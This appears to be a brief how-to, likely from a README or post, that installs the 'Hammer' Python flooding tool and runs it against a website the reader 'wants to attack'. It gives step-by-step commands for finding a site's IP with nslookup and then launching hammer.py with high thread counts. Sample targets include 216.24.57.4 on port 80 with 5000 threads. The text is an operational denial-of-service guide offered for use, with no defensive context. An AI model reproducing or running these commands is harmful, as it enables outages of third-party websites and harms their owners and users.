$ apt update
$ apt upgrade
$ apt install python
$ apt install git
$ apt install dnsutils
$ git clone https://github.com/Pavithran-R/Hammer/

Hammer need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website

then
$ cd Hammer
$ python hammer.py -s [ip Address] -t 135
example:
$ python hammer.py -s 123.45.67.89 -t 135

Video Tutorial: How to use Hammer Watch it


$ python hammer.py -s 127.0.0.1 -p 8000 -t 500

python hammer.py -s 216.24.57.4 -p 80 -t 5000

